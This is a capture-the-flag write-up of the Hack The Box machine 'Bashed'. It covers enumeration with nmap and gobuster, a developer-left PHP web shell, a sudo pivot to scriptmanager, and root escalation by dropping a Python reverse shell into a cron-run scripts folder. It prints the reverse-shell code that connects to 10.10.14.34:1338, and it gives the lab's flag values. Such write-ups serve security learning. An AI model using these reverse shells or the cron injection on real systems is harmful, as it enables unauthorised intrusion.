@@ -1,0 +1,298 @@
+#+TITLE: HTB - Bashed
+#+AUTHOR: Leonardo Tamiano
+
+* Enum
+** nmap
+*** nmap -sC -sV bashed
+    #+begin_example
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 07:59 EST
+Nmap scan report for bashed (10.10.10.68)
+Host is up (0.048s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Arrexel's Development Site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
+    #+end_example
+
+*** nmap -p- bashed
+    #+begin_example
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 07:59 EST
+Nmap scan report for bashed (10.10.10.68)
+Host is up (0.047s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds    
+    #+end_example
+
+** port 80 (http)
+*** Vulnerability: Directory indexing is open
+    http://bashed/images/
+
+    The web server allows us to see the contents of a given directory.
+
+*** gobuster
+**** gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bashed -x php
+     #+begin_example
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://bashed
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2023/12/19 08:11:39 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 301] [--> http://bashed/images/]
+/.php                 (Status: 403) [Size: 285]
+/uploads              (Status: 301) [Size: 302] [--> http://bashed/uploads/]
+/php                  (Status: 301) [Size: 298] [--> http://bashed/php/]
+/css                  (Status: 301) [Size: 298] [--> http://bashed/css/]
+/dev                  (Status: 301) [Size: 298] [--> http://bashed/dev/]
+/js                   (Status: 301) [Size: 297] [--> http://bashed/js/]
+/config.php           (Status: 200) [Size: 0]    
+     #+end_example
+*** Vulnerability: Critical php code was left open to anyone
+    By going into the URL
+    
+    http://bashed/dev/phpbash.php
+
+    we're able to execute a php web shell. This was left by the
+    developer, and everyone can access the directory
+
+    http://bashed/dev/
+* Foothold (kali -> www-data)
+  By doing ~nmap~ we see a web server open
+
+  #+begin_example
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+  #+end_example
+
+  By enumerating resources with ~gobuster~ we see the ~/dev/~ folder, and
+  by going there we see a php web shell
+
+  #+begin_example
+/dev                  (Status: 301) [Size: 298] [--> http://bashed/dev/]
+  #+end_example
+
+  #+begin_example
+http://bashed/dev/phpbash.php
+  #+end_example
+
+  this allows us to execute code as the user www-data.
+* System Enum
+** uname -a
+ #+begin_example
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ #+end_example
+
+** lsb_release -a
+ #+begin_example
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description: Ubuntu 16.04.2 LTS
+Release: 16.04
+Codename: xenial
+ #+end_example
+
+** cat /etc/passwd
+ #+begin_example
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
+scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
+ #+end_example
+
+** sudo -l as www-data
+   #+begin_example
+sudo -l
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+   #+end_example
+* Pivoting (www-data -> scriptmanager)
+  First we spawn a reverse shell into the system
+
+  #+begin_src sh
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  #+end_src
+  
+  #+begin_src sh
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
+  #+end_src
+
+  In practice.
+
+  #+begin_example
+www-data@bashed:/home/arrexel$ sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
+<el$ sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'   
+scriptmanager@bashed:/home/arrexel$ whoami
+whoami
+scriptmanager
+  #+end_example
+  
+* PrivEsc (scriptmanager -> root)
+  By going into ~/~ folder we see a weird directory named ~scripts~
+
+  #+begin_example
+scriptmanager@bashed:/$ ls -lha
+ls -lha
+total 92K
+drwxr-xr-x  23 root          root          4.0K Jun  2  2022 .
+drwxr-xr-x  23 root          root          4.0K Jun  2  2022 ..
+-rw-------   1 root          root           174 Jun 14  2022 .bash_history
+drwxr-xr-x   2 root          root          4.0K Jun  2  2022 bin
+drwxr-xr-x   3 root          root          4.0K Jun  2  2022 boot
+drwxr-xr-x  19 root          root          4.1K Dec 19 04:34 dev
+drwxr-xr-x  89 root          root          4.0K Jun  2  2022 etc
+drwxr-xr-x   4 root          root          4.0K Dec  4  2017 home
+lrwxrwxrwx   1 root          root            32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root          4.0K Dec  4  2017 lib
+drwxr-xr-x   2 root          root          4.0K Jun  2  2022 lib64
+drwx------   2 root          root           16K Dec  4  2017 lost+found
+drwxr-xr-x   4 root          root          4.0K Dec  4  2017 media
+drwxr-xr-x   2 root          root          4.0K Jun  2  2022 mnt
+drwxr-xr-x   2 root          root          4.0K Dec  4  2017 opt
+dr-xr-xr-x 186 root          root             0 Dec 19 04:34 proc
+drwx------   3 root          root          4.0K Jun  2  2022 root
+drwxr-xr-x  18 root          root           500 Dec 19 04:34 run
+drwxr-xr-x   2 root          root          4.0K Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager 4.0K Jun  2  2022 scripts
+drwxr-xr-x   2 root          root          4.0K Feb 15  2017 srv
+dr-xr-xr-x  13 root          root             0 Dec 19 05:22 sys
+drwxrwxrwt  10 root          root          4.0K Dec 19 05:34 tmp
+drwxr-xr-x  10 root          root          4.0K Dec  4  2017 usr
+drwxr-xr-x  12 root          root          4.0K Jun  2  2022 var
+lrwxrwxrwx   1 root          root            29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+  #+end_example
+
+  If we check the directory it has a python script named ~test.py~ with the following content
+
+  #+begin_src python
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+  #+end_src
+
+  By checking cronjobs with ~pspy64~
+
+  https://github.com/DominicBreuker/pspy
+
+  we see the following
+
+  #+begin_example
+2023/12/19 05:46:01 CMD: UID=0     PID=1469   | python test.py 
+2023/12/19 05:47:01 CMD: UID=0     PID=1475   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
+  #+end_example
+
+  as we can see, we have a cronjob which executes the following sh code
+
+  #+begin_src sh
+cd /scripts;
+for f in *.py; do
+    python "$f";
+done 
+  #+end_src
+
+  this scripts executes as the ~root~ user all the files ending with ~.py~
+  within the folder ~/scripts~. Since as the user ~scriptmanager~ we can
+  write arbitrary files into that folder, we're able to introduce a
+  reverse shell named ~rev.py~
+
+  #+begin_src python
+import socket,subprocess,os;
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.34",1338));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+  #+end_src
+
+  and then we listen for it on the endpoint provided ~10.10.14.34:1338~
+  and we obtain a root shell at the end of the minute
+
+  #+begin_example
+└─$ nc -lvnp 1338                       
+listening on [any] 1338 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.68] 51658
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:b9:5d:0e brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.68/32 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:5d0e/64 scope global mngtmpaddr dynamic 
+       valid_lft 86395sec preferred_lft 14395sec
+    inet6 fe80::250:56ff:feb9:5d0e/64 scope link 
+       valid_lft forever preferred_lft forever
+  #+end_example
+  
+* Post Exploitation
+  The cronjob registed in the machine were as follows
+
+  #+begin_example
+root@bashed:~# crontab -l
+crontab -l
+ * * * * * cd /scripts; for f in *.py; do python "$f"; done
+  #+end_example
+* Flags
+** user flag
+   #+begin_example
+www-data@bashed:/home/arrexel# cat user.txt
+649f11e6ed4c6e33405ba65634431031
+   #+end_example
+
+** root flag
+   #+begin_example
+# cat root.txt
+f362a833d804058d4b640a32b92c14fd
+   #+end_example
+
